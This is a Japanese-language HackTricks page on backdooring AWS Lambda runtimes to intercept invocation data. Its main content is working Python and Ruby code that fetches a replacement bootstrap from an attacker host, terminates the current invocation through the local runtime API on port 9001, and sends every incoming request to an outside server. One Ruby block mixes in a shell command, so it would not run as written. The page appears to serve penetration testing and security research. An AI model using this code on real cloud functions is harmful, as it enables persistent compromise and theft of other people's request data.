# AWS - Lambdaリクエストの盗み出し

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* 自分のハッキングテクニックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## はじめに <a href="#python-runtime" id="python-runtime"></a>

この攻撃は、実行中のLambdaに対してある種の**アクセス権限**があることを前提としています。\
また、重要な点として、**Lambdaの呼び出しは完全に分離されていないが、隔離されている**ことに注意してください。これらは同じ実行環境で実行される可能性がありますが、同時には実行されません。それを考慮に入れて、環境を分析してみましょう。

### 隔離

Lambdaの隔離は、次のcgroupsを使用しています：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

プレフィックスの「sandbox」は、一般的なコンテナエンジン（Docker、Podman、LXD、rkt）に一致しなかったため、プロプライエタリなコンテナエンジンである可能性があります。このプロプライエタリなコンテナエンジンは、[runC](https://github.com/opencontainers/runc)のようなオープンソースのコンテナランタイムを内部で使用している可能性があります。

### Lambdaの動作 <a href="#python-runtime" id="python-runtime"></a>

これはPython Lambdaのアーキテクチャのようです：

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. コンテナの外部にあるプロセス（initバイナリ内の「**slicer**」と呼ばれる）が、共有メモリを介して**init**プロセスに呼び出しイベントを送信します。
2. initプロセスは、ポート9001（ハードコード）でHTTPサーバーを設定し、いくつかのエンドポイントを公開します：
   1. /2018-06-01/runtime/invocation/**next** - 次の呼び出しイベントを取得します
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** - invokeのハンドラ応答を返します
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** - 実行エラーを返します
3. `bootstrap.py`では、次のループがinitプロセスに新しいイベントを問い合わせ、それを処理するためにユーザーの関数（ここではアップロードしたリクエストハンドラ）を呼び出します。

<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>

4. **ハンドラの応答は、次のエンドポイントのいずれかを介してinitプロセスに送信**されます：
   1. `/{invoke-id}/response` - ユーザーハンドラが正常に実行された場合
   2. `/{invoke-id}/error` - invokeの処理中に例外が発生した場合

## 技術の概要 <a href="#python-runtime" id="python-runtime"></a>

Lambda関数に送信されるデータを**傍受**するために、悪意のあるコードで**ブートストラップスクリプト**を置き換えることが可能です。\
他の言語で他のエンジンを使用している場合、その言語で書かれた別の**ブートストラップスクリプト**があるため、これは**Pythonだけでなく他の言語を使用した他のLambdaでも行うことができます**。

## Python <a href="#python-runtime" id="python-runtime"></a>

Lambdaから、**`/var/runtime/bootstrap.py`**をダウンロードします（または**独自のLambdaを起動**して取得します）そして、Lambdaに送信されるすべてのデータを漏洩させるバックドアを追加します。以下のような数行を追加するだけです：

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### ランタイムの置換

新しい**`boostrap.py`**を作成したので、それを**ダウンロード**し、現在のLambdaの**呼び出し**を**終了**させ、それを実行して正規のものと**置き換える**ことができます。
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
または、[twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py)を使用することもできます。これにより、以前と同様に呼び出しを終了し、新しいブートストラップを実行して情報を外部に流出させることができます。

{% hint style="warning" %}
Lambda関数が5〜15分間使用されない場合、シャットダウンされ、次回呼び出される際にすべての変更が失われます。
{% endhint %}

## Rubyランタイム <a href="#ruby-runtime" id="ruby-runtime"></a>

Rubyでは、バックドアを追加したいファイルは**`/var/runtime/lib/runtime.rb`**ファイルです（システムから取得するか、独自のLambdaを実行してください）。

バックドアの追加は、Pythonバージョンと同様に簡単です：
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
次に、Pythonバージョンで行ったことを変更して実行するだけです：

* **バックドアをディレクトリにダウンロードします**
* `/var/runtime/lib/*` をバックドアがあるディレクトリに**シンボリックリンク**します
* 現在のLambda呼び出しを終了します
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## 参考文献

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする。
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
